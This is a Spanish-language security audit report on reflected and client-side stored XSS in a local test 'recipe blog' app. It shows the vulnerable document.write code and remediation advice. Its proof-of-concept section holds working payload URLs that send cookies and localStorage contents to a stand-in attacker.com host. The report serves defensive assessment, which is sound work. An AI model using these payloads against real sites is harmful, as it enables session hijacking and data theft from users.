# Informe de Auditoría de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30 15:59:56  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Vulnerabilidades Cross-Site Scripting (XSS)  
**Herramienta:** Análisis manual + curl  

---

## Resumen Ejecutivo

Se identificaron **2 vulnerabilidades XSS** en la aplicación web "Blog de Recetas" alojada en `http://web.dev.local:8082`:

1. **XSS Reflejado** — Parámetro `search` en la URL
2. **XSS Almacenado (cliente)** — Parámetros `name` y `comment` almacenados en `localStorage`

Ambas vulnerabilidades derivan del uso inseguro de `document.write()` con datos no sanitizados provenientes de la URL y del almacenamiento local del navegador.

---

## Descripción de la Aplicación

La aplicación es un **blog de recetas** desarrollado completamente en HTML + JavaScript del lado del cliente (sin backend que procese los datos). Dispone de dos funcionalidades principales:

- **Buscador de recetas**: acepta el parámetro `?search=` en la URL
- **Sistema de comentarios**: acepta los parámetros `?name=` y `?comment=` en la URL, almacena los datos en `localStorage` y los renderiza en la página

El servidor web es **Apache/2.4.65 (Unix)** sirviendo un fichero HTML estático.

---

## Vulnerabilidades Detectadas

### 1. XSS Reflejado — Parámetro `search`

**Severidad:** Alta  
**CVSS:** ~7.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)  

#### Descripción

El código JavaScript de la página lee el parámetro `search` de la URL y lo inserta directamente en el DOM mediante `document.write()` sin ningún tipo de codificación o sanitización:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

Si `searchTerm` contiene código HTML/JavaScript malicioso, éste será interpretado y ejecutado por el navegador de la víctima.

#### Payload de explotación

```
http://web.dev.local:8082/?search=<script>alert('XSS_Reflejado')</script>
```

Payload alternativo (evita filtros de etiqueta `<script>`):

```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS')>
```

#### Impacto

- Robo de sesión / cookies (si existen)
- Redirección a sitios maliciosos
- Phishing en contexto del sitio legítimo
- Ejecución de acciones en nombre del usuario

---

### 2. XSS Almacenado (cliente) — Parámetros `name` y `comment`

**Severidad:** Alta  
**CVSS:** ~7.6 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)  

#### Descripción

Los comentarios enviados mediante el formulario se almacenan en el `localStorage` del navegador y se renderizan posteriormente sin sanitización:

```javascript
// Almacenamiento (vulnerable)
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Renderizado (vulnerable)
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Un atacante puede inyectar código malicioso en los campos `name` o `comment` que se ejecutará cada vez que el usuario cargue la página (mientras el dato permanezca en `localStorage`).

#### Payload de explotación

```
http://web.dev.local:8082/?name=Atacante&comment=<script>alert('XSS_Almacenado')</script>
```

Payload persistente en `name`:

```
http://web.dev.local:8082/?name=<img src=x onerror=alert('XSS_name')>&comment=Comentario+normal
```

#### Impacto

- El payload se **persiste en el navegador** mediante `localStorage`
- Se ejecuta en **cada visita** subsiguiente hasta que se borren los comentarios
- Puede usarse para keylogging, robo de datos del localStorage, o modificar la apariencia de la página

---

## Pruebas de Concepto

### PoC 1 — XSS Reflejado

**URL de ataque:**
```
http://web.dev.local:8082/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**Resultado esperado:** El navegador ejecuta el script y redirige al servidor del atacante enviando las cookies de la víctima.

### PoC 2 — XSS Almacenado (exfiltración de localStorage)

**URL de ataque:**
```
http://web.dev.local:8082/?name=Hacker&comment=<script>fetch('http://attacker.com/steal?data='+encodeURIComponent(JSON.stringify(localStorage)))</script>
```

**Resultado esperado:** El script se almacena en `localStorage`, y en cada carga posterior de la página envía todos los datos almacenados al servidor del atacante.

---

## Análisis de Código Fuente

Las líneas clave vulnerables identificadas en el HTML:

| Línea | Parámetro | Código vulnerable |
|-------|-----------|-------------------|
| ~120  | `search`  | `document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');` |
| ~160  | `name`    | `document.write('<div class="comment-author">' + c.name + '</div>');` |
| ~161  | `comment` | `document.write('<div>' + c.comment + '</div>');` |

---

## Recomendaciones

### Solución inmediata: Sanitizar la salida

Utilizar una función de escape HTML antes de insertar datos en el DOM:

```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.appendChild(document.createTextNode(text));
    return div.innerHTML;
}

// Uso correcto:
document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
document.write('<div class="comment-author">' + escapeHtml(c.name) + '</div>');
document.write('<div>' + escapeHtml(c.comment) + '</div>');
```

### Solución recomendada: Usar APIs DOM seguras en lugar de `document.write`

```javascript
// En lugar de document.write, usar:
const p = document.createElement('p');
p.textContent = 'Resultados para: ' + searchTerm;  // textContent escapa automáticamente
resultsDiv.appendChild(p);
```

### Medidas adicionales

1. **Content Security Policy (CSP):** Configurar cabecera HTTP que restrinja la ejecución de scripts inline:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

2. **Validación de entrada:** Limitar los caracteres aceptados en los campos de búsqueda y comentarios.

3. **X-XSS-Protection:** Aunque deprecado, puede activarse como medida adicional:
   ```
   X-XSS-Protection: 1; mode=block
   ```

---

## Conclusión

La aplicación presenta **vulnerabilidades XSS críticas** tanto de tipo reflejado como almacenado (en cliente). La raíz del problema es el uso de `document.write()` con datos controlados por el usuario sin ningún proceso de sanitización o codificación.

Dado que toda la lógica reside en el cliente (JavaScript), el atacante puede:
- Crear URLs maliciosas para ataques de phishing dirigido (XSS reflejado)
- Inyectar código persistente en el navegador de la víctima mediante el sistema de comentarios (XSS almacenado)

Se recomienda **corrección inmediata** aplicando escapado HTML en todas las inserciones de datos controlados por el usuario.

---

*Informe generado el 2026-04-30 por análisis automatizado + revisión manual.*
